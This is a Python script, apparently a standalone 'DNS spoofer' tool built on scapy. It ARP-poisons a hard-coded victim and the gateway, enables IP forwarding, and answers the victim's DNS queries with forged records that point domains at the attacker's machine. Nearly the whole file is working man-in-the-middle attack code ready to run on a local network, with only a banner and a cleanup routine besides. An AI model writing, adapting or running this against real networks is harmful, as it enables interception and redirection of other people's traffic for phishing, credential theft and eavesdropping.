import signal
from threading import Thread
from scapy.layers.dns import *
from scapy.layers.inet import *

print('\033[36m                                                                 ')
print('                                                                 ')
print('  XXXX  X    X XXXXX   XXXXX XXXXX XXXXX XXXXX XXXXX XXXXX XXXX  ')
print('  X   X X X  X X       X     X   X X   X X   X X     X     X   X ')
print('  X   X X  X X XXXXX   XXXXX XXXXP X   X X   X XXXXX XXXXX XXXX  ')
print('  X   X X   XX     X       X X     X   X X   X X     X     X   X ')
print('  XXXX  X    X XXXXX   XXXXX X     XXXXX XXXXX X     XXXXX X   X ')
print('                                                                 ')
print('  Written by unknownpgr                                          ')
print('                                                                 ')
print('  Contact : UnknownPgr@gmail.com                                 ')
print('\033[0m                                                                 ')

loop = True
mac_broadcast = "ff:ff:ff:ff:ff:ff"


def get_mac(host):
    os.popen('ping -c 1 %s' % host)
    fields = os.popen('grep "%s " /proc/net/arp' % host).read().split()
    if len(fields) == 6 and fields[3] != "00:00:00:00:00:00":
        return fields[3]


def current_ip():
    import socket
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]


def default_gateway():
    lines = os.popen('route -n').readlines()
    for line in lines:
        part = line.split()
        if len(part) == 8 and part[1] != '0.0.0.0' and part[1] != 'Gateway':
            return part[1]


def use_forwarding(use):
    if use:
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
            ipf.write('1\n')
    else:
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
            ipf.write('0\n')


print('\nsetting :')

router_ip = default_gateway()
victim_ip = '192.168.0.3'
router_mac = get_mac(router_ip)
victim_mac = get_mac(victim_ip)

target_adr = 'com'
server_ip = current_ip()

print(' victim :', victim_ip)
print(' router :', router_ip)
print(' target :', target_adr)
print(' server :', server_ip)


def thread_sniff():
    # Make this part use dictionary.
    def dns_responder(pkt):
        if DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0:
            if target_adr in str(pkt['DNS Question Record'].qname):
                ip = pkt.getlayer(IP)
                udp = pkt.getlayer(UDP)
                dns = pkt.getlayer(DNS)
                queried_host = str(dns.qd.qname)[2:-2]

                print('\npacket captured : dns query = ', queried_host)

                dns_answer = DNSRR(rrname=queried_host,
                                   ttl=330,
                                   type="A",
                                   rclass="IN",
                                   rdata=server_ip)

                dns_reply = IP(src=ip.dst,
                               dst=ip.src) / \
                            UDP(sport=udp.dport,
                                dport=udp.sport) / \
                            DNS(
                                id=dns.id,
                                qr=1,
                                aa=0,
                                rcode=0,
                                qd=dns.qd,
                                an=dns_answer
                            )
                send(dns_reply, verbose=False)

    while loop:
        sniff(count=1, filter='src ' + victim_ip + ' && port 53', prn=dns_responder, timeout=3)


def thread_spoof():
    packet_num = 0
    while loop:
        # op : ARP Type : 2=ARP Request
        # Send victim that router is current device
        send(ARP(op=2, psrc=router_ip, pdst=victim_ip, hwdst=victim_mac), verbose=False)
        # Sent router that victim is current device
        send(ARP(op=2, psrc=victim_ip, pdst=router_ip, hwdst=router_mac), verbose=False)
        packet_num += 1
        if packet_num % 10 == 0:
            print('\r\nsent arp spoofing packet :', packet_num)
        time.sleep(1)


sniffer = Thread(target=thread_sniff)
sniffer.start()

spoofer = Thread(target=thread_spoof)
spoofer.start()

print('\nstart forwarding...')
use_forwarding(True)
print('forwarding started.')


def killed(arg1, arg2):
    global loop
    loop = False
    print('\narf restore...', end='\n\n')
    for i in range(3):
        time.sleep(1)
        send(ARP(op=2, pdst=router_ip, psrc=victim_ip, hwdst=mac_broadcast, hwsrc=victim_mac), count=5, verbose=False)
        send(ARP(op=2, pdst=victim_ip, psrc=router_ip, hwdst=mac_broadcast, hwsrc=router_mac), count=5, verbose=False)
        print('\r\033[32msent spoofing restore packet :', 3 - i)
    print('\n\033[0mstop sniffing...')
    if sniffer.is_alive():
        sniffer.join()
    print('sniffing finished.')
    print('\nstop forwarding...')
    use_forwarding(False)
    print('forwarding finished')
    print('\nprogram finished')


signal.signal(signal.SIGINT, killed)
